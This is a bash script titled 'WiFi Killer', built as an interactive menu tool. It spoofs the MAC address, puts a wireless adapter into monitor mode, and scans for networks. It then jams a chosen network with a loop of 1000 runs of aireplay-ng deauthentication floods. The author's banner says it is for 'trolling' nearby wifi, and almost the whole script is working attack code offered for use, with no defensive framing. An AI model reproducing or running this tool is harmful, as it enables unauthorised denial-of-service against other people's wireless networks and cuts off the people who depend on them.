##!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
RESTORE="\e[39"
clear
echo -e $GREEN '
 __      __._____________.__   ____  __.__.__  .__                
/  \    /  \__\_   _____/|__| |    |/ _|__|  | |  |   ___________ 
\   \/\/   /  ||    __)  |  | |      < |  |  | |  | _/ __ \_  __ \
 \        /|  ||     \   |  | |    |  \|  |  |_|  |_\  ___/|  | \/
  \__/\  / |__|\___  /   |__| |____|__ \__|____/____/\___  >__|   
       \/          \/                 \/                 \/       
v1.1						        @viperzcrew

'
echo -e $RED '
Welcome to the WiFi Killer, this is an simple tool to kill nearby wifi networks.
Please do not use it for revange, only for trolling.
Written by MrBlackX
'
echo -e $CYAN "
[*] You will get now options to setting up your wireless adapter, 
if you already started your wireless adapter into monitor mode, 
skip it with n for no."
echo -e $CYAN "
[1] Start Monitor Mode [Required] + MAC Spoofing
[2] Scan For A Target & Attack Them [Attack]
[3] Check MAC Address
[4] Disable Monitor Mode [Optional]
[5] Credits
[6] Exit
"

read -p "[*] Choose an option: " inp1
echo "" 

if [[ "$inp1" = 1 ]]; then
	echo -e $RED "
[!] Note your common wireless mode is wlan0, if you do not use any other wireless hardwares,
then type ifconfig to see your wireless adapter, it is mostly wlan0.
	"

	read -p "[*] Enter your wireless mode(default: wlan0): " mode1
	clear
	figlet Killing Network Processes...
	airmon-ng check kill
	xterm -e bash /root/WiFi_Killer/mac_spoofer.sh
	echo -e $MAGENTA "Done.."
    bash /root/WiFi_Killer/wifi_killer.sh

fi


clear

if [[ "$inp1" = 2 ]]; then
	echo -e $MAGENTA " "
	figlet Target Scanner
	echo -e "\e[1mIf you are not sure type: ifconfig at me it was \e[4mwlan0\e[0m."
	echo -e $MAGENTA " "
	read -p "[*] Enter your wireless mode(default: wlan0): " mode2
	clear
	figlet Scanning...
	echo -e $RED "[!] PRESS CTRL+C TO STOP THE SCAN!"
	sleep 2
	airodump-ng $mode2
	echo -e $BLUE " "
	read -p "[*] Enter the Target BSSID: " target
	read -p "[*] Enter the channel: " channel
	echo -e $RED "
[!] It will open a xterm, after 10-20 seconds close it with CTRL+C to start attack!
"
	read -p "Press ENTER to continue" 
	clear
#	echo -e $BLUE " "
#	figlet Processing...
#	sleep 1
#	echo -e $RED "[!] Getting the the STATION address please wait..!"
#	airodump-ng -c $channel --bssid $target -w PSK $mode2 
	echo -e $YELLOW " "
#	read -p "[*] Enter the STATION address: " station
	read -p "[?] Do you want to perfom an Attack? [y/N]" ask
	if [[ "$ask" = "y" || "$ask" = "Y" ]]; then
		echo -e $BLUE " "
		echo "[!] YOUR MODE IS: $mode2"
		echo "[!] YOUR TARGET IS: $target"
		echo "[!] YOUR CHANNEL IS: $channel"
#		echo "[!] YOUR STATION IS: $station"
		sleep 5
		clear
		echo -e $YELLOW " "
		figlet Killing Selected Wifi...
		export target
		export mode2
		export channel
		xterm -e bash /root/WiFi_Killer/beacon.sh
		sleep 3
		for i in {1..1000}
		do

			aireplay-ng --deauth 10000 -a $target $mode2
			sleep 1
		done
		echo -e $GREEN "[+] You have successfully killed the Network.
		Exiting in 3 seconds...
		"
	fi
	bash /root/WiFi_Killer/wifi_killer.sh
fi

if [[ "$inp1" = 3 ]]; then
	macchanger wlan0
	sleep 3
	bash /root/WiFi_Killer/wifi_killer.sh
fi

if [[ "$inp1" = 4 ]]; then
	iw wlan0 del
	iw wlan0monmon del
	airmon-ng stop wlan0
fi

if [[ "$inp1" = 5 ]]; then
	echo -e $BLUE " "
	figlet VIPERZCREW
	echo "coded by mrblackx!"
	echo "YouTube:  https://www.youtube.com/channel/UCWzhjHOUFTqi3bCxbNo4kqg"
	echo "GitHub:   https://github.com/ViperZCrew"
	echo "WhatsApp: https://wa.me/4915206072840"
	echo "E-Mail:	(SOON)"
sleep 5
fi

if [[ "$inp1" = 6 ]]; then
	exit
fi

sleep 3

service network-manager restart

exit

